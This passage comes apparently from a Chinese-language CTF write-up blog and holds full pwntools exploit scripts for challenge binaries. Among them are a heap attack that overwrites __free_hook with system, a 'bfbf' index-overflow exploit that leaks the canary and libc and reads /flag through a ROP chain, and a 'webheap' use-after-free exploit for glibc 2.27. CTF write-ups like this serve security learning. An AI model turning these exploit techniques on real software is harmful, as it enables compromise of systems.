</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x7f</span><span class=s2>&#34;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x10</span> <span class=o>-</span> <span class=mi>96</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;__malloc_hook&#34;</span><span class=p>]</span> <span class=o>-</span><span class=mh>0x400</span>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s2>&#34;libc base is leaked ==&gt; &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>dele</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x68</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x81</span><span class=p>)</span> <span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;__free_hook&#34;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;system&#34;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dele</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=bfbf>bfbf</h2><p>该处函数存在数组索引溢出，然后这里存在栈里的地址泄露，以及栈里的数据篡改漏洞
<img src=/img/2022-11-06-NTFY/39.png alt>
而上图的++i &ndash;i等需要在另一个函数(如下)里来设置对应的值
<img src=/img/2022-11-06-NTFY/40.png alt></p><p>而这里我们想让对应的内存单元为对应的选项，就要输入不同的符号来标记一下。</p><p>先泄露栈里存放的libc地址和堆地址(用于存放后面打orw时的字符串flag)，然后直接让索引改到返回地址(libc_start_main)，直接从这里开始写rop链。根据沙箱规则来看的话，没有禁用execve，但不知道为啥我打execve没法获取shell。最后还是打的orw，不过read的话,文件描述符不能大于1，所以要先close关掉标准输入，然后再open，从而read write读出flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./attachment.bk.bk&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./attachment.bk.bk&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./libc.so.6&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span><span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=s2>&#34;&gt;&#34;</span><span class=o>*</span><span class=mh>0x208</span><span class=o>+</span><span class=s1>&#39;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;&#39;</span><span class=o>+</span><span class=s2>&#34;&gt;&#34;</span><span class=o>*</span><span class=mh>0x18</span><span class=o>+</span><span class=s2>&#34;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span><span class=s2>&#34;&lt;&#34;</span><span class=o>*</span><span class=mi>6</span><span class=o>+</span><span class=s2>&#34;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;&#34;</span><span class=o>*</span><span class=mi>22</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;BF_PARSER&gt;&gt;&#34;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>canary</span><span class=o>=</span><span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s2>&#34;canary = &#34;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>canary</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>stack_addr</span><span class=o>=</span><span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x7f</span><span class=s2>&#34;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s2>&#34;stack_addr = &#34;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>stack_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x00\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf_base</span><span class=o>=</span><span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span><span class=o>-</span><span class=mh>0x1955</span>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s2>&#34;elf_base = &#34;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>elf_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span><span class=o>=</span><span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x7f</span><span class=s2>&#34;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span><span class=o>-</span><span class=mh>0x24083</span>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s2>&#34;libc_base = &#34;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi_ret</span><span class=o>=</span><span class=n>elf_base</span><span class=o>+</span><span class=mh>0x00000000000019f3</span>
</span></span><span class=line><span class=cl><span class=n>ret</span><span class=o>=</span><span class=n>elf_base</span><span class=o>+</span><span class=mh>0x000000000000101a</span>
</span></span><span class=line><span class=cl><span class=n>bin_sh</span><span class=o>=</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>)</span><span class=o>.</span><span class=fm>__next__</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>pop_rsi_ret</span><span class=o>=</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x000000000002601f</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdx_ret</span><span class=o>=</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x0000000000142c92</span>
</span></span><span class=line><span class=cl><span class=n>system_addr</span><span class=o>=</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>close_addr</span><span class=o>=</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;close&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>open_addr</span><span class=o>=</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;open&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>read_addr</span><span class=o>=</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>puts_addr</span><span class=o>=</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>exit_addr</span><span class=o>=</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;exit&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>close_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>stack_addr</span><span class=o>+</span><span class=mh>0xb0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi_ret</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>open_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi_ret</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>stack_addr</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx_ret</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x50</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>read_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>stack_addr</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>puts_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>exit_addr</span><span class=p>)</span><span class=o>+</span><span class=sa>b</span><span class=s1>&#39;/flag</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=webheap>webheap</h2><p>2.27的堆，delete中有个uaf，直接通过uaf泄露libc地址，然后改fd为free_hook，并向free_hook写入system地址，然后free一个内容为/bin/sh\x00的堆块就可以了，数据开头的80，81，82，83，分别代表后面接1字节，2字节，4字节，8字节，选项要以86开头。
exp如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./webheap&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>make_qword</span><span class=p>(</span><span class=n>val</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x83</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>val</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>make_dword</span><span class=p>(</span><span class=n>val</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x86</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>val</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>make_str</span><span class=p>(</span><span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xbd</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=nb>str</span><span class=p>)</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=s1>&#39;little&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=nb>str</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>packet</span><span class=p>(</span><span class=n>opt</span><span class=p>,</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=p>,</span><span class=n>ctt</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xb9\x05</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>make_dword</span><span class=p>(</span><span class=n>opt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>make_qword</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>make_qword</span><span class=p>(</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>make_str</span><span class=p>(</span><span class=n>ctt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>make_qword</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sendpkt</span><span class=p>(</span><span class=n>opt</span><span class=p>,</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=o>=</span><span class=mh>0x30</span><span class=p>,</span><span class=n>ctt</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;aaa&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>packet</span><span class=p>(</span><span class=n>opt</span><span class=p>,</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=p>,</span><span class=n>ctt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Packet length: &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Content: &#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>script</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dbg</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>sh</span><span class=p>,</span><span class=n>script</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rbt_bpt</span><span class=p>(</span><span class=n>off</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>script</span>
</span></span><span class=line><span class=cl>    <span class=n>script</span> <span class=o>+=</span> <span class=sa>f</span><span class=s1>&#39;b * $rebase(</span><span class=si>{</span><span class=n>off</span><span class=si>:</span><span class=s1>#x</span><span class=si>}</span><span class=s1>)</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># rbt_bpt(0x3d80)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sendpkt</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sendpkt</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dele</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sendpkt</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>ctt</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sendpkt</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>idx</span><span class=p>,</span><span class=n>ctt</span><span class=o>=</span><span class=n>ctt</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># dbg()</span>
</span></span><span class=line><span class=cl><span class=c1># sendpkt(0x0,0x0,0x520)</span>
</span></span><span class=line><span class=cl><span class=c1># sendpkt(0x0,0x1,0x30)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x520</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x60</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dele</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># libc = ELF(&#39;./libc.so.6&#39;,checksec=False)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc-2.27.so&#39;</span><span class=p>,</span><span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>unsort_off</span> <span class=o>=</span> <span class=mh>0x3ebca0</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x7f</span><span class=s1>&#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>-</span> <span class=n>unsort_off</span>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s2>&#34;libc_base : &#34;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>libc_base</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x60</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=mh>0x60</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># dbg()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dele</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dele</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># rbt_bpt(0x195f)</span>
</span></span><span class=line><span class=cl><span class=n>freehook</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>freehook</span><span class=p>)[:</span><span class=mi>6</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=mh>0x60</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;/bin/sh;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span><span class=mh>0x60</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>])[:</span><span class=mi>6</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>dele</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=store>store</h2><p>只允许add两次，每次两个堆块，且可以free四次，size需要小于0xfff。
